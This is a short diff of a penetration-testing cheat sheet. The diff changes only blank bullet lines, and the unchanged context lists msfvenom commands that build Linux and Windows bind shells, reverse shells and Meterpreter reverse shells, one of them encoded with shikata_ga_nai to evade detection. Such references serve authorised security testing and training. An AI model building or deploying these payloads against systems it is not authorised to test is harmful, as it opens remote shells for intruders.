@@ -13,17 +13,17 @@ msfvenom -l
   - Bind shell
     - msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > shell.elf
   - Reverse shell
-    - 
+    
 
 - Windows
   - Meterpreter reverse shell
     - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
   - Meterpreter bind shell
-    - 
+  
   - Reverse shell
     - msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
   - Bind shell
-    -
+  
   - Meterpreter encoded reverse shell 
     - msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
   
